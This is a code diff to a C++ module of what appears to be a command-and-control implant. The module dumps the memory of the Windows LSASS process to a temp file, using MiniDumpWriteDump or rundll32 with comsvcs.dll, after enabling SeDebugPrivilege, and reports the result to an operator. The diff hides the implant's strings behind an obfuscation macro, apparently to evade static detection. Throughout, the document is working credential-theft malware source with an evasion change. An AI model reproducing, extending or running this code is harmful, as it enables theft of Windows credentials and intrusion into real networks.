@@ -102,7 +102,7 @@ static auto declfn find_lsass_pid( instance& inst ) -> DWORD {
     pe.dwSize = sizeof(PE32);
 
     DWORD lsass_pid = 0;
-    char target[] = { 'l','s','a','s','s','.','e','x','e', 0 };
+    xstr(target, "lsass.exe");
 
     if ( pProcess32First( h_snap, &pe ) ) {
         do {
@@ -130,7 +130,7 @@ static auto declfn do_minidump(
         PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid );
     if ( !h_lsass ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "OpenProcess lsass failed" ) ) );
+            XSTR( "OpenProcess lsass failed" ) );
         return;
     }
 
@@ -140,7 +140,7 @@ static auto declfn do_minidump(
     if ( !h_dbghelp ) {
         inst.kernel32.CloseHandle( h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary dbghelp failed" ) ) );
+            XSTR( "LoadLibrary dbghelp failed" ) );
         return;
     }
 
@@ -150,7 +150,7 @@ static auto declfn do_minidump(
     if ( !pMiniDumpWriteDump ) {
         inst.kernel32.CloseHandle( h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "MiniDumpWriteDump not found" ) ) );
+            XSTR( "MiniDumpWriteDump not found" ) );
         return;
     }
 
@@ -166,7 +166,7 @@ static auto declfn do_minidump(
     if ( h_file == INVALID_HANDLE_VALUE ) {
         inst.kernel32.CloseHandle( h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateFileA dump path failed" ) ) );
+            XSTR( "CreateFileA dump path failed" ) );
         return;
     }
 
@@ -181,15 +181,15 @@ static auto declfn do_minidump(
 
     if ( !ok ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "MiniDumpWriteDump failed" ) ) );
+            XSTR( "MiniDumpWriteDump failed" ) );
         return;
     }
 
     // success
     char msg[512] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "LSASS dumped to " ) ) );
+    str_copy( msg, XSTR( "LSASS dumped to " ) );
     str_concat( msg, dump_path );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " (minidump)" ) ) );
+    str_concat( msg, XSTR( " (minidump)" ) );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
 
@@ -202,15 +202,14 @@ static auto declfn do_comsvcs(
 ) -> void {
     // build command: rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <pid> <path> full
     char cmdline[512] = { 0 };
-    str_copy( cmdline, symbol<char*>( const_cast<char*>(
-        "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump " ) ) );
+    str_copy( cmdline, XSTR("rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump ") );
 
     char pid_str[12] = { 0 };
     int_to_str( pid_str, lsass_pid, 10 );
     str_concat( cmdline, pid_str );
-    str_concat( cmdline, symbol<char*>( const_cast<char*>( " " ) ) );
+    str_concat( cmdline, XSTR( " " ) );
     str_concat( cmdline, dump_path );
-    str_concat( cmdline, symbol<char*>( const_cast<char*>( " full" ) ) );
+    str_concat( cmdline, XSTR( " full" ) );
 
     wchar_t wcmdline[512] = { 0 };
     inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline, -1, wcmdline, 512 );
@@ -232,7 +231,7 @@ static auto declfn do_comsvcs(
 
     if ( !ok ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessW comsvcs failed" ) ) );
+            XSTR( "CreateProcessW comsvcs failed" ) );
         return;
     }
 
@@ -252,14 +251,14 @@ static auto declfn do_comsvcs(
 
     if ( exit_code != 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "comsvcs MiniDump failed" ) ) );
+            XSTR( "comsvcs MiniDump failed" ) );
         return;
     }
 
     char msg[512] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "LSASS dumped to " ) ) );
+    str_copy( msg, XSTR( "LSASS dumped to " ) );
     str_concat( msg, dump_path );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " (comsvcs)" ) ) );
+    str_concat( msg, XSTR( " (comsvcs)" ) );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
 
@@ -277,7 +276,7 @@ auto declfn starburst::cmd_lsass_dump(
 
     if ( !method_str || method_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need method: minidump or comsvcs" ) ) );
+            XSTR( "need method: minidump or comsvcs" ) );
         return;
     }
 
@@ -298,12 +297,12 @@ auto declfn starburst::cmd_lsass_dump(
         if ( pGetTempPathA ) {
             DWORD tlen = pGetTempPathA( 260, dump_path );
             if ( tlen == 0 || tlen > 240 ) {
-                str_copy( dump_path, symbol<char*>( const_cast<char*>( "C:\\Windows\\Temp\\" ) ) );
+                str_copy( dump_path, XSTR( "C:\\Windows\\Temp\\" ) );
             }
         } else {
-            str_copy( dump_path, symbol<char*>( const_cast<char*>( "C:\\Windows\\Temp\\" ) ) );
+            str_copy( dump_path, XSTR( "C:\\Windows\\Temp\\" ) );
         }
-        str_concat( dump_path, symbol<char*>( const_cast<char*>( "d.dmp" ) ) );
+        str_concat( dump_path, XSTR( "d.dmp" ) );
     }
 
     // enable SeDebugPrivilege for cross-process access
@@ -314,13 +313,13 @@ auto declfn starburst::cmd_lsass_dump(
     DWORD lsass_pid = find_lsass_pid( inst );
     if ( lsass_pid == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "lsass.exe not found" ) ) );
+            XSTR( "lsass.exe not found" ) );
         return;
     }
 
     // dispatch based on method
-    char minidump_str[] = { 'm','i','n','i','d','u','m','p', 0 };
-    char comsvcs_str[]  = { 'c','o','m','s','v','c','s', 0 };
+    xstr(minidump_str, "minidump");
+    xstr(comsvcs_str, "comsvcs");
 
     if ( str_icmp( method, minidump_str ) == 0 ) {
         do_minidump( inst, task_uuid, dump_path, lsass_pid );
@@ -328,7 +327,7 @@ auto declfn starburst::cmd_lsass_dump(
         do_comsvcs( inst, task_uuid, dump_path, lsass_pid );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "unknown method: use minidump or comsvcs" ) ) );
+            XSTR( "unknown method: use minidump or comsvcs" ) );
     }
 }
 
